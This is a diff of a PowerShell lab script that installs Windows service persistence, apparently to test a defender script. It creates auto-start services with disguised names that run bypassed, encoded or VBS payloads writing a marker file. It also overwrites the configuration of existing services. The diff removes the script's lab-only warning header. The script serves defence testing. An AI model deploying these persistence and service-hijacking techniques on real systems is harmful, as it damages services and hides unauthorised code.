@@ -1,11 +1,3 @@
-#Requires -RunAsAdministrator
-# Lab-only Windows service persistence generator for testing defender.ps1.
-# Snapshot VM only: this intentionally overwrites existing service configurations.
-# Cleanup is reverting the VMware snapshot.
-
-Set-StrictMode -Version Latest
-$ErrorActionPreference = 'Stop'
-
 $workDir = Join-Path $env:ProgramData 'PersistenceShowdownLab\Services'
 $payloadPath = 'C:\Users\Public\Documents\pwned.txt'
 $payloadText = 'Pwn3d'
@@ -34,6 +26,16 @@ $existingServiceCandidates = @(
 function Write-Step { param([string]$Text) Write-Host "[*] $Text" -ForegroundColor Cyan }
 function Write-OK { param([string]$Text) Write-Host "    [OK] $Text" -ForegroundColor Green }
 function Write-Warn { param([string]$Text) Write-Host "    [WARN] $Text" -ForegroundColor Yellow }
+
+function Invoke-ServiceAttempt {
+    param([string]$Name, [scriptblock]$ScriptBlock)
+
+    try {
+        & $ScriptBlock
+    } catch {
+        Write-Warn "Service attempt '$Name' failed: $_"
+    }
+}
 
 function Remove-LabService {
     param([string]$Name)
@@ -69,7 +71,7 @@ if ($DelaySeconds -gt 0) { Start-Sleep -Seconds $DelaySeconds }
 New-Item -ItemType Directory -Path 'C:\Users\Public\Documents' -Force | Out-Null
 Set-Content -LiteralPath 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -NoNewline -Encoding ASCII
 "@
-    Set-Content -LiteralPath $Path -Value $content -Encoding ASCII
+    Set-Content -LiteralPath $Path -Value $content -Encoding ASCII -ErrorAction Stop
 }
 
 function New-PayloadVbs {
@@ -85,7 +87,7 @@ Set f = fso.CreateTextFile("C:\Users\Public\Documents\pwned.txt", True)
 f.Write "Pwn3d"
 f.Close
 '@
-    Set-Content -LiteralPath $Path -Value $content -Encoding ASCII
+    Set-Content -LiteralPath $Path -Value $content -Encoding ASCII -ErrorAction Stop
 }
 
 function New-EncodedPayload {
@@ -117,7 +119,7 @@ function New-LabService {
     Write-OK "Created service $Name"
 }
 
-function Overwrite-ExistingService {
+function Set-ExistingServicePersistence {
     param([string]$Name, [string]$BinaryPath, [switch]$DelayedAuto)
 
     & sc.exe config $Name binPath= $BinaryPath start= auto | Out-Null
@@ -145,40 +147,64 @@ function Get-HijackTargets {
 }
 
 Write-Step "Preparing service helper files"
-New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 $profileCacheScript = Join-Path $workDir 'svc-profile-cache.ps1'
 $eventBridgeScript = Join-Path $workDir 'svc-event-bridge.ps1'
 $vbsScript = Join-Path $workDir 'svc-script-host.vbs'
-New-PayloadScript -Path $profileCacheScript
-New-PayloadScript -Path $eventBridgeScript -DelaySeconds 15
-New-PayloadVbs -Path $vbsScript
-Write-OK "Helper files written to $workDir"
+$helpersReady = $false
+try {
+    New-Item -ItemType Directory -Path $workDir -Force -ErrorAction Stop | Out-Null
+    New-PayloadScript -Path $profileCacheScript
+    New-PayloadScript -Path $eventBridgeScript -DelaySeconds 15
+    New-PayloadVbs -Path $vbsScript
+    $helpersReady = $true
+    Write-OK "Helper files written to $workDir"
+} catch {
+    Write-Warn "Could not prepare service helper files: $_"
+}
 
 Write-Step "Removing previous lab-owned new services"
-Remove-NewLabServices
-Write-OK "Removed lab-owned new services if present"
+try {
+    Remove-NewLabServices
+    Write-OK "Removed lab-owned new services if present"
+} catch {
+    Write-Warn "Could not remove previous lab-owned new services: $_"
+}
 
 Write-Step "Installing 3 new Windows service persistence variants"
-$encoded = New-EncodedPayload
+$encoded = ''
+try {
+    $encoded = New-EncodedPayload
+} catch {
+    Write-Warn "Could not generate encoded service payload: $_"
+}
 
-New-LabService `
-    -Name 'PSUnitSvcProfileCache' `
-    -DisplayName 'Profile Cache Maintenance' `
-    -Description 'Lab test: new auto-start service that launches a ProgramData PowerShell helper.' `
-    -BinaryPath "`"$psExe`" -NoProfile -ExecutionPolicy Bypass -File `"$profileCacheScript`""
+Invoke-ServiceAttempt 'PSUnitSvcProfileCache' {
+    if (-not $helpersReady) { throw 'helper files were not prepared' }
+    New-LabService `
+        -Name 'PSUnitSvcProfileCache' `
+        -DisplayName 'Profile Cache Maintenance' `
+        -Description 'Lab test: new auto-start service that launches a ProgramData PowerShell helper.' `
+        -BinaryPath "`"$psExe`" -NoProfile -ExecutionPolicy Bypass -File `"$profileCacheScript`""
+}
 
-New-LabService `
-    -Name 'PSUnitSvcWinUpdateCache' `
-    -DisplayName 'Windows Update Cache Monitor' `
-    -Description 'Lab test: new delayed auto-start service using an encoded PowerShell command.' `
-    -BinaryPath "`"$psExe`" -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded" `
-    -DelayedAuto
+Invoke-ServiceAttempt 'PSUnitSvcWinUpdateCache' {
+    if ([string]::IsNullOrWhiteSpace($encoded)) { throw 'encoded payload was not generated' }
+    New-LabService `
+        -Name 'PSUnitSvcWinUpdateCache' `
+        -DisplayName 'Windows Update Cache Monitor' `
+        -Description 'Lab test: new delayed auto-start service using an encoded PowerShell command.' `
+        -BinaryPath "`"$psExe`" -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded" `
+        -DelayedAuto
+}
 
-New-LabService `
-    -Name 'PSUnitSvcScriptHost' `
-    -DisplayName 'Script Host Telemetry' `
-    -Description 'Lab test: new auto-start service using Windows Script Host and a VBS helper.' `
-    -BinaryPath "$wscriptExe //B `"$vbsScript`""
+Invoke-ServiceAttempt 'PSUnitSvcScriptHost' {
+    if (-not $helpersReady) { throw 'helper files were not prepared' }
+    New-LabService `
+        -Name 'PSUnitSvcScriptHost' `
+        -DisplayName 'Script Host Telemetry' `
+        -Description 'Lab test: new auto-start service using Windows Script Host and a VBS helper.' `
+        -BinaryPath "$wscriptExe //B `"$vbsScript`""
+}
 
 Write-Step "Overwriting 2 existing service names"
 $targets = @(Get-HijackTargets)
@@ -190,12 +216,13 @@ $i = 0
 foreach ($target in $targets) {
     try {
         if ($i -eq 0) {
-            Overwrite-ExistingService `
+            if (-not $helpersReady) { throw 'helper files were not prepared' }
+            Set-ExistingServicePersistence `
                 -Name $target `
                 -BinaryPath "`"$psExe`" -NoProfile -ExecutionPolicy Bypass -File `"$eventBridgeScript`"" `
                 -DelayedAuto
         } else {
-            Overwrite-ExistingService `
+            Set-ExistingServicePersistence `
                 -Name $target `
                 -BinaryPath "$cmdExe /c if not exist C:\Users\Public\Documents mkdir C:\Users\Public\Documents & echo $payloadText>$payloadPath"
         }
